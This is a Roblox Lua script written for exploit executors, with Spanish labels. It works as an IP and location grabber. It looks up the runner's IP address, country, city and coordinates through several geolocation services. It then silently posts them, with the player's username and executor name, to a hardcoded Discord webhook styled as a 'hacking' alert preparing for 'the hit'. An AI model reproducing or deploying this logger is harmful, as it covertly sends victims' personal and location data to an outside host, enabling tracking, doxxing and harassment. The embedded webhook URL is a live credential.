local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

local function codeToEmoji(code)
    if not code or #code ~= 2 then return "🏳️" end
    local first = string.byte(code:sub(1,1):upper()) - 65 + 0x1F1E6
    local second = string.byte(code:sub(2,2):upper()) - 65 + 0x1F1E6
    return utf8.char(first, second)
end

local function detectLocation()
    local country, countryCode, city, ip, lat, lon = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil
    local services = {
        "https://ipapi.co/json",
        "https://ipwhois.app/json/",
        "https://ipinfo.io/json",
        "http://ip-api.com/json",
        "https://geolocation-db.com/json/",
        "https://ipgeolocation.io/ip-location-api.json",
        "https://freegeoip.app/json/"
    }
    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return (syn and syn.request or http_request or request)({Url=url, Method="GET"}).Body
        end)
        if success and response then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
            if ok and data then
                local latTemp = tonumber(data.latitude or data.lat or data.latitudeValue or data.latitudeDecimal)
                local lonTemp = tonumber(data.longitude or data.lon or data.longitudeValue or data.longitudeDecimal)
                if latTemp and lonTemp then
                    country = data.country_name or data.country or country
                    countryCode = data.country_code or data.country or countryCode
                    city = data.city or data.region_name or city
                    ip = data.ip or data.IPAddress or ip
                    lat = latTemp
                    lon = lonTemp
                    break
                end
            end
        end
    end
    local emojiCountry = codeToEmoji(countryCode)
    local displayCountry = country.." "..emojiCountry
    local km = "N/A"
    local lat0, lon0 = 0, 0
    if lat and lon then
        local function deg2rad(deg) return deg * math.pi / 180 end
        local R = 6371
        local dLat = deg2rad(lat - lat0)
        local dLon = deg2rad(lon - lon0)
        local a = math.sin(dLat/2)^2 + math.cos(deg2rad(lat0))*math.cos(deg2rad(lat))*math.sin(dLon/2)^2
        local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
        km = math.floor(R * c)
    end
    local longDisplay = lat and lon and (lat..", "..lon) or "N/A"
    return displayCountry, city, km, longDisplay, ip
end

local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP = detectLocation()

if getgenv().WebhookEnviado then return end
getgenv().WebhookEnviado = true

local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
local avatarUrl = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

local data = {
    ["username"] = "⚠️ ALERTA VIP INFO HACKING",
    ["avatar_url"] = avatarUrl,
    ["content"] = "**⚠️ Ejecución detectada, prepárate para recoger el hit 🚨**",
    ["embeds"] = {{
        ["description"] = "Información capturada automáticamente con el mejor sistema hacking:",
        ["color"] = 16729344,
        ["thumbnail"] = {["url"] = avatarUrl},
        ["fields"] = {
            {["name"]="📡 IP", ["value"]=userIP, ["inline"]=true},
            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
            {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
            {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
            {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
            {["name"]="🗺️ Longitud", ["value"]=longDisplay, ["inline"]=true},
            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
            {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
        },
        ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
    }}
}

local FinalData = HttpService:JSONEncode(data)
local req = syn and syn.request or http_request or request
if req then
    pcall(function()
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = FinalData
        })
    end)
end
